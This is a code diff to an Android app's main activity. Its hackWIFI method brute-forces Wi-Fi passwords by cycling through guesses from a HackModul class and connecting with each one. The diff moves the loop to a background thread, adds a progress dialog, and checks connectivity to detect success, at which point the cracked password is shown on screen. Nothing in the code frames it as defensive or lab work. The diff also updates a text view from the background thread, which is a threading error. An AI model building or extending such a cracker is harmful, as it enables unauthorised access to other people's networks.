@@ -2,11 +2,14 @@ package com.dominik.wlancrawl;
 
 import android.Manifest;
 import android.annotation.TargetApi;
+import android.app.ProgressDialog;
 import android.content.BroadcastReceiver;
 import android.content.Context;
 import android.content.Intent;
 import android.content.IntentFilter;
 import android.content.pm.PackageManager;
+import android.net.ConnectivityManager;
+import android.net.NetworkInfo;
 import android.net.wifi.ScanResult;
 import android.net.wifi.WifiConfiguration;
 import android.net.wifi.WifiManager;
@@ -61,6 +64,7 @@ public class MainActivity extends AppCompatActivity
                 scan();
             }
         });
+
     }
 
     @Override
@@ -119,28 +123,74 @@ public class MainActivity extends AppCompatActivity
         return (res != -1) && b && c;  // todo: how to recognise, when password was correct !?
     }
 
-    private void hackWIFI(String ssid)
+    private void hackWIFI(final String ssid)
     {
-        HackModul hackModul = new HackModul(ssid);
-        String currentPas = "";
-        while (hackModul.hasNext())
+        final ProgressDialog dialog = new ProgressDialog(this);
+        dialog.setCancelable(false);
+        dialog.setCanceledOnTouchOutside(false);
+        dialog.setIndeterminate(true);
+        dialog.setMessage(String.format(getString(R.string.hacking), ssid));
+        dialog.setProgressStyle(ProgressDialog.STYLE_SPINNER);
+        dialog.show();
+
+        Thread backgroundThread = new Thread(new Runnable()
         {
-            currentPas = hackModul.next();
-
-            Log.i("WIFI", "try: " + currentPas);
-
-            if (connect(ssid, currentPas))
+            @Override
+            public void run()
             {
-                if (wifi.pingSupplicant())
+                HackModul hackModul = new HackModul(ssid);
+                String currentPas = "";
+                boolean isConnected = false;
+
+                while (hackModul.hasNext())
                 {
-                    Log.i("WIFI", "found wlan");
-                    TextView txtPas = (TextView) findViewById(R.id.txtPassword);
-                    String text = String.format(getString(R.string.password_for), ssid, currentPas);
-                    txtPas.setText(text);
-                    break;
+                    currentPas = hackModul.next();
+
+                    Log.i("WIFI", "try: " + currentPas);
+
+                    if (connect(ssid, currentPas))
+                    {
+                        ConnectivityManager connManager = (ConnectivityManager) getSystemService(Context.CONNECTIVITY_SERVICE);
+                        NetworkInfo mWifi = connManager.getNetworkInfo(ConnectivityManager.TYPE_WIFI);
+
+                        if (mWifi.isConnected())
+                        {
+                            Log.i("WIFI", "found wlan");
+                            TextView txtPas = (TextView) findViewById(R.id.txtPassword);
+                            String text = String.format(getString(R.string.password_for), ssid, currentPas);
+                            txtPas.setText(text);
+                            isConnected = true;
+                            break;
+                        }
+                    }
                 }
+
+                // show toast message, if hacking was not successful
+                // not pretty to work twice on the UI-thread, but probably better then haven a new global var
+                if (!isConnected)
+                {
+                    runOnUiThread(new Runnable()
+                    {
+                        @Override
+                        public void run()
+                        {
+                            Toast.makeText(MainActivity.this, String.format(getString(R.string.no_pas_found), ssid), Toast.LENGTH_SHORT).show();
+                        }
+                    });
+                }
+
+                // close the spinning box
+                runOnUiThread(new Runnable()
+                {
+                    @Override
+                    public void run()
+                    {
+                        dialog.dismiss();
+                    }
+                });
             }
-        }
+        });
+        backgroundThread.start();
     }
 
     private class WifiScanReceiver extends BroadcastReceiver
